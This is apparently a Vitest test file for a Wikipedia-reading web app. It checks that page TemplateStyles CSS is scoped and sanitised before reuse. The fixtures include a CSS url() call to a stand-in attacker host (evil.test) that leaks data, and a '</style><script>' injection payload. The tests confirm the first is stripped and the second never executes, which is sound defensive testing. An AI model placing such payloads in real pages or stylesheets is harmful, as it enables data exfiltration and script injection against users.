import { afterEach, describe, expect, it, vi } from "vitest";
import { render } from "@testing-library/react";
import { fetchFullArticle } from "@/lib/wiki/article";
import { ArticleLeadBlock } from "@/components/topic/ArticleBody";
import { scopeArticleCss } from "@/lib/wiki/cssScope";

// TemplateStyles reuse — the FULL render/apply path (templatestyles-reuse spec; spike §5).
// Proves: (1) `fetchFullArticle` REUSES the page's own `<style>`/TemplateStyles CSS text
// (scoped under `.wiki-body`) while still REMOVING the `<style>` elements from the rendered
// DOM and dropping the X4 threats inside the CSS; (2) the headline application-path X4: the
// scoped CSS is applied via `textContent`, so a `</style>`-injection fragment is inert; (3)
// the no-styled-content no-op (AC11); (4) AC3 — a HELD-OUT template family (the sortable
// table from `Comparison of web browsers`, never hand-styled in #74/#104/#91) is carried
// faithfully by the generic reuse path with ZERO new per-template rules.

function mockArticleHtml(body: string): void {
  vi.spyOn(globalThis, "fetch").mockResolvedValue(
    new Response(`<html><body>${body}</body></html>`, {
      status: 200,
      headers: { "content-type": "text/html" },
    })
  );
}
afterEach(() => vi.restoreAllMocks());

// ───────────────────── fetchFullArticle reuse path (AC4–AC7 at the source) ─────────────
describe("fetchFullArticle — reuses page <style> CSS, scoped + stripped", () => {
  it("carries the page's clade CSS on styleCss (scoped), strips the <style> element + its url() exfil", async () => {
    mockArticleHtml(
      `<section><h2>Evolution</h2>` +
        `<div class="clade">` +
        `<span class="mw-empty-elt"><style data-mw-deduplicate="TemplateStyles:r1" typeof="mw:Extension/templatestyles">` +
        `.mw-parser-output table.clade td.clade-label{border-left:1px solid;border-bottom:1px solid;background:url(https://evil.test/?leak=1)}` +
        `</style></span>` +
        `<table class="clade"><tbody><tr><td class="clade-label first">Felidae</td></tr></tbody></table>` +
        `</div></section>`
    );
    const a = await fetchFullArticle("Cat");
    // The clade geometry is reused, scoped under .wiki-body, with the url() exfil dropped.
    expect(a.styleCss).toContain(".wiki-body");
    expect(a.styleCss).toContain("table.clade td.clade-label");
    expect(a.styleCss).toContain("border-left:1px solid");
    expect(a.styleCss).not.toContain("evil.test");
    expect(a.styleCss).not.toMatch(/url\s*\(/i);
    // The <style> ELEMENT is still removed from the rendered body (X4 unchanged).
    const body = a.lead.leadHtml + "\n" + a.sections.map((s) => s.html).join("\n");
    expect(body.toLowerCase()).not.toContain("<style");
    expect(body).not.toContain("evil.test");
  });

  it("no <style> blocks → styleCss is '' (no-op; AC11 no-styled-content article)", async () => {
    mockArticleHtml(`<section><p>Plain prose, no styled content.</p></section>`);
    const a = await fetchFullArticle("Pythagorean_theorem");
    expect(a.styleCss).toBe("");
  });

  it("AC3 — a HELD-OUT sortable-table family (Comparison of web browsers) is carried with ZERO new rules", async () => {
    // The `.sortable`/`.sticky-header` TemplateStyles family is shipped by sortable data
    // tables (e.g. en.wikipedia.org/wiki/Comparison_of_web_browsers) and was NEVER
    // hand-styled by wiki+ (#74 = infobox/taxobox, #104 = clade, #91 = .tmulti). The
    // generic reuse path scopes + carries it with no per-template CSS authored by us. The
    // `position:static` sticky-header reset is KEPT (only fixed/absolute/sticky are dropped).
    const HELD_OUT_CSS =
      `.mw-parser-output .sortable.wikitable th.headerSort{padding-right:0.4em}` +
      `.mw-parser-output .sticky-header.jquery-tablesorter>thead{position:static;top:auto}` +
      `.mw-parser-output .wikitable.sortable td{vertical-align:top}`;
    mockArticleHtml(
      `<section><h2>Comparison</h2>` +
        `<style data-mw-deduplicate="TemplateStyles:r123" typeof="mw:Extension/templatestyles">${HELD_OUT_CSS}</style>` +
        `<table class="wikitable sortable"><tbody>` +
        `<tr><th class="headerSort">Browser</th><th class="headerSort">Engine</th></tr>` +
        `<tr><td>Firefox</td><td>Gecko</td></tr>` +
        `</tbody></table></section>`
    );
    const a = await fetchFullArticle("Comparison_of_web_browsers");
    // The held-out family's rules are reused, scoped under .wiki-body.
    expect(a.styleCss).toContain(".wiki-body");
    expect(a.styleCss).toContain(".sortable.wikitable th.headerSort");
    expect(a.styleCss).toContain("padding-right:0.4em");
    expect(a.styleCss).toContain(".wikitable.sortable td");
    // The sticky-header reset survives (position:static kept).
    expect(a.styleCss).toContain("position:static");
    // The data table itself still renders + the <style> element is removed.
    const body = a.lead.leadHtml + "\n" + a.sections.map((s) => s.html).join("\n");
    expect(body).toContain("Firefox");
    expect(body.toLowerCase()).not.toContain("<style");
  });
});

// ───────────────── Application-path X4 — the HEADLINE: textContent, never innerHTML ─────
declare global {
  // eslint-disable-next-line no-var
  var __pwned: number | undefined;
}

describe("application path X4 — </style>-injection is inert (applied via textContent)", () => {
  it("a </style><script> fragment in the article CSS produces ZERO <script> and never sets the flag", async () => {
    globalThis.__pwned = undefined;
    // This is the exact spike §5.1 vector: tolerant CSS parse preserves the trailing
    // `</style><script>…` as a literal substring. If it were applied via innerHTML the
    // HTML parser would honor the close tag and run the script; via textContent it is inert.
    const malicious = `.a{color:red}</style><script>window.__pwned=1</script>`;
    const scoped = await scopeArticleCss(malicious);
    // Sanity: the dangerous substring DOES survive in the scoped string (so the test is
    // meaningful — the defense is the APPLICATION mechanism, not the scoper).
    expect(scoped.toLowerCase()).toContain("<script");

    const { container } = render(
      <ArticleLeadBlock
        title="X"
        url="https://en.wikipedia.org/wiki/X"
        lead={{ title: "X", url: "https://en.wikipedia.org/wiki/X", leadHtml: "<p>x</p>" }}
        styleCss={scoped}
      />
    );

    // Zero <script> elements anywhere — the fragment is inert text inside the <style>.
    expect(container.querySelectorAll("script").length).toBe(0);
    expect(document.querySelectorAll("script").length).toBe(0);
    // The flag stays unset: the injected script never executed.
    expect(globalThis.__pwned).toBeUndefined();
    // The CSS WAS mounted as a <style> element's textContent (one real rule applied).
    const styleEl = container.querySelector("style");
    expect(styleEl).not.toBeNull();
    expect(styleEl?.textContent).toContain("color:red");
    // And it lives inside the .wiki-body subtree so the scope prefix resolves.
    expect(styleEl?.closest(".wiki-body")).not.toBeNull();
  });

  it("empty styleCss mounts NO <style> element (no-op artifact-free; AC11)", () => {
    const { container } = render(
      <ArticleLeadBlock
        title="X"
        url="https://en.wikipedia.org/wiki/X"
        lead={{ title: "X", url: "https://en.wikipedia.org/wiki/X", leadHtml: "<p>x</p>" }}
        styleCss=""
      />
    );
    expect(container.querySelector("style")).toBeNull();
  });
});
